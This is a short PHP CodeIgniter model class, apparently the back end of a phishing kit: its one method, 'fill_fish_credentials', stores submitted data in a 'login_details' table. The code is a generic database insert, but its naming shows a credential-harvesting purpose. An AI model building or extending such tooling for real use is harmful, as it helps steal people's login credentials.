<?php

class Phishing_model extends CI_Model{

	function __construct(){
	    parent::__construct();
	}

	public function fill_fish_credentials($data){

		return $this->db->insert('login_details', $data);

	}
}



?>